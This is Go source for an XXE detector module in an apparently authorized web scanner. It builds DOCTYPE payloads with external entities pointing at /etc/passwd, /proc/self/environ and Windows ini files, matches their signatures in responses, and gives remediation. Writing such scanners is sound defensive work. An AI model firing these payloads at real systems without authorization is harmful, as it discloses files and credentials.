// XML External Entity injection.
//
// # What upstream actually does, and what that means for the port
//
// Upstream does not inject through a parameter. It rewrites the *document*:
// `xxe.rb` prepends `<!DOCTYPE xxe_entity [ <!ENTITY xxe_entity SYSTEM "<path>"> ]>`
// to the request body and substitutes the affected input value with
// `&xxe_entity;`, then reads the platform's file signature out of the answer.
// That is a document mutation, and this package's `Point` is a *parameter*
// substitution — a probe that reproduces the request with exactly one of its
// values replaced.
//
// The two cannot be reconciled by copying the code, so the technique is
// restated in the shape this package can fire: the submitted value is itself a
// document, carrying its own DOCTYPE and its own entity reference. That reaches
// exactly the same parser — the one that expands entities in submitted XML — and
// it is the only shape that can reach it from a parameter surface at all. Where
// the application builds the document itself and concatenates the parameter into
// a field, the parameter-embedded document is what gets parsed, and the entity
// expands.
//
// # The file list is upstream's, and it is per-platform
//
// `unix` is `/proc/self/environ` and `/etc/passwd`; `windows` is
// `%SYSTEMDRIVE%\boot.ini` and `%WINDIR%\win.ini`. `/proc/self/environ` is the
// better first probe and the reason is worth stating: it leaks the server's own
// environment, which on a misconfigured deployment includes database credentials,
// and it does so in `KEY=value` lines that cannot be confused with the layout of a
// password file.
//
// # Why the row is verified when it fires, and capped when it does not
//
// A parsed file's own bytes appearing in the response is the file. But the
// signatures here are matched against a *pattern* rather than read as a
// document, because a scanner must decide from bytes whether they are
// `/etc/passwd` and not something else that happens to contain a colon. So a
// match on the strongest signature — the `root:x:0:0:root` line, which is fixed
// in every `/etc/passwd` — is verified, and a match on a weaker one (`bin`, which
// appears in half of all files on a Unix host) is capped.
package active

import (
	"context"
	"fmt"
	"strings"
)

// xxeTarget is one file the entity is pointed at.
type xxeTarget struct {
	// platform is reported with the match, because "which OS" is the first
	// question the operator asks and this detector already knows the answer.
	platform string
	// path is the SYSTEM identifier.
	path string
	// payload is the SYSTEM identifier as a URI. `file://` is explicit rather
	// than a bare path because a bare path is not a URI and some parsers require
	// the scheme; the other parsers require its absence. Both forms are sent.
	payload string
	// signature is what the file's own content looks like.
	signature string
	// strong marks a signature that cannot plausibly appear by accident. The
	// `root:x:0:0:root` line is fixed in every `/etc/passwd` on every Linux
	// host; `bin` is a substring of half the files in `/bin`.
	strong bool
	// description says what the read discloses.
	description string
}

// xxeTargets is upstream's payload table with its per-platform split kept, plus
// the signatures that decide whether a match is a file or a coincidence.
var xxeTargets = []xxeTarget{
	{
		platform: "unix",
		path:     "/proc/self/environ",
		payload:  "file:///proc/self/environ",
		// The process environment is `KEY=value` lines. Nothing else on a web
		// page is a line of `UPPER_SNAKE=...`, so this is a shape rather than a
		// word, and it is the shape that discloses credentials when it fires.
		// `LANG` is set on every POSIX process that has a locale, and the newline
		// before it makes this a line-start shape rather than the word "LANG"
		// appearing somewhere on a page. An earlier version of this entry matched a
		// bare `\n=`, and the table also carried `/etc/hostname` matched on a bare
		// `\n`; both were removed rather than kept, because a signature that every
		// multi-line page contains is not a fingerprint — it is a way to report
		// every URL a scan touches.
		signature: "\nLANG=",
		strong:    false,
		description: "the server process's own environment, which on a misconfigured deployment carries " +
			"database credentials, session secrets and API keys",
	},
	{
		platform: "unix",
		path:     "/etc/passwd",
		payload:  "file:///etc/passwd",
		// The fixed root line. Every /etc/passwd on every Unix host begins its
		// root entry this way, so a match is the file and not a resemblance.
		signature:   "root:x:0:0:",
		strong:      true,
		description: "the host's user database, including every account name and login shell",
	},
	{
		platform: "windows",
		path:     `%SYSTEMDRIVE%\boot.ini`,
		payload:  `%SYSTEMDRIVE%\boot.ini`,
		// `[boot loader]` is the literal first section heading of boot.ini on
		// every Windows install; nothing else in a response is bracketed in
		// lowercase like that.
		signature:   "[boot loader]",
		strong:      true,
		description: "the Windows boot configuration, which names the installed operating system",
	},
	{
		platform: "windows",
		path:     `%WINDIR%\win.ini`,
		payload:  "%WINDIR%\\win.ini",
		// `[fonts]` is the opening section of win.ini on every Windows install.
		signature:   "[fonts]",
		strong:      true,
		description: "the Windows installation directory and its font table",
	},
}

// xxeEntityName is the entity the document declares.
//
// It is upstream's `xxe_entity`, kept because a parser that has been taught to
// ignore this particular name — some do, via a denylist that predates the
// technique — will not ignore a different one, so the port keeps the known name
// and gains nothing from renaming it.
const xxeEntityName = "xxe_entity"

// xxeDocument builds the submitted value: a document that declares an external
// entity and then references it.
//
// The declaration is embedded rather than merely referenced, and that is the
// whole point. A document that references `&xxe_entity;` without declaring it is
// not well-formed, and a parser that rejects malformed input before expanding
// anything will reject it for a reason unrelated to entities. Declaring the
// entity first makes the document well-formed and puts the expansion in front of
// the parser as the only thing left to do.
func xxeDocument(system string) string {
	return fmt.Sprintf(`<!DOCTYPE r [<!ENTITY %s SYSTEM "%s">]><r>&%s;</r>`,
		xxeEntityName, system, xxeEntityName)
}

// XXE is the XML external entity detector.
type XXE struct{}

// Name implements Module.
func (XXE) Name() string { return "xxe" }

// Level implements Module.
func (XXE) Level() Level { return LevelParam }

// Scan probes one surface with each target until one answers.
func (m XXE) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	for _, target := range xxeTargets {
		if ctx.Err() != nil {
			return nil
		}
		payload := xxeDocument(target.payload)
		resp, err := t.Fire(ctx, p, p.Param, payload, false, nil)
		if err != nil {
			continue
		}
		finding := xxeFinding(p, baseline, resp, target, payload)
		if finding == nil {
			continue
		}
		return []Finding{*finding}
	}
	return nil
}

// xxeFinding decides whether one response is a file and at what tier.
//
// The weak signature is the reason this function exists as a separate step. A
// bare `\n` or a bare `=` will match something on most pages, and a detector that
// reported XXE on those would be reporting a newline. So a weak match is only
// credited when the response *also* changed in a way the unmodified page did not,
// and even then the row is capped: the operator is told the surface reads a file,
// and is not told which one was proven.
func xxeFinding(p Point, baseline, injected *Response, target xxeTarget, payload string) *Finding {
	if injected == nil || !strings.Contains(injected.Body, target.signature) {
		return nil
	}
	if !Fresh(baseline, injected, target.signature) {
		// The signature was already on the page. A page that documents /etc/passwd
		// contains `root:x:0:0:` without reading anything, and this is the check
		// that keeps such a page from producing a critical row on every parameter.
		return nil
	}
	tier := TierPotential
	if target.strong {
		// The signature is fixed for every copy of this file, so its appearance
		// after an injected entity declaration is the file and not a shape.
		tier = TierVerified
	} else if baseline == nil || baseline.Body == injected.Body {
		// A weak signature on an unmodified-looking response is a coincidence.
		return nil
	}
	claimed := SeverityHigh
	if target.path == "/etc/passwd" {
		claimed = SeverityHigh
	}
	finding, _ := NewFinding(Spec{
		Module:   "xxe",
		Title:    "XML External Entity (" + target.platform + ", " + target.platform + " read of " + target.path + ")",
		Claimed:  claimed,
		Tier:     tier,
		Point:    p,
		Payload:  payload,
		Evidence: Snippet(injected.Body, target.signature, 160),
		Description: "The submitted value was parsed as an XML document, the external entity it declared was " +
			"expanded, and the target's content came back in the response — this discloses " +
			target.description + ".",
		Remediation: "Disable external entity resolution and DTD processing in the XML parser. In libxml2 set " +
			"XML_PARSE_NOENT off and use XML_PARSE_NONET; in Java use a DocumentBuilderFactory with " +
			"disallow-doctype-decl set. Then validate the input against a schema rather than resolving " +
			"whatever the document declares.",
	})
	return &finding
}
